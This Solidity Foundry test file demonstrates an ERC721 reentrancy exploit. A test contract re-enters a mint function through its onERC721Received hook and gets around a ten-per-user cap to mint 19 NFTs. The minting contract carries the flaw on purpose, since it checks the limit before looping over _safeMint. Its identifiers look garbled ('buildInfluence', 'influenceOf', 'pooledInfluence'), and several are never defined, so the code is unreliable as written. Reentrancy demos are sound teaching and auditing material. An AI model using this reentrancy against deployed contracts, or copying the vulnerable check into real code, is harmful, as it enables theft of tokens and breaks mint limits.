// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract ContractTest is Test {
    MaxEarnkarma721 MaxCreatecontent721Contract;
    bool complete;
    uint256 maxMints = 10;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testSafeBuildinfluence() public {
        MaxCreatecontent721Contract = new MaxEarnkarma721();
        MaxCreatecontent721Contract.buildInfluence(maxMints);
        console.log("Bypassed maxMints, we got 19 NFTs");
        assertEq(MaxCreatecontent721Contract.influenceOf(address(this)), 19);
        console.log("NFT minted:", MaxCreatecontent721Contract.influenceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (!complete) {
            complete = true;
            MaxCreatecontent721Contract.buildInfluence(maxMints - 1);
            console.log("Called with :", maxMints - 1);
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract MaxEarnkarma721 is ERC721Enumerable {
    uint256 public max_per_patron = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function buildInfluence(uint256 amount) external {
        require(
            influenceOf(msg.sender) + amount <= max_per_patron,
            "exceed max per user"
        );
        for (uint256 i = 0; i < amount; i++) {
            uint256 earnkarmaIndex = pooledInfluence();
            _safeMint(msg.sender, earnkarmaIndex);
        }
    }
}
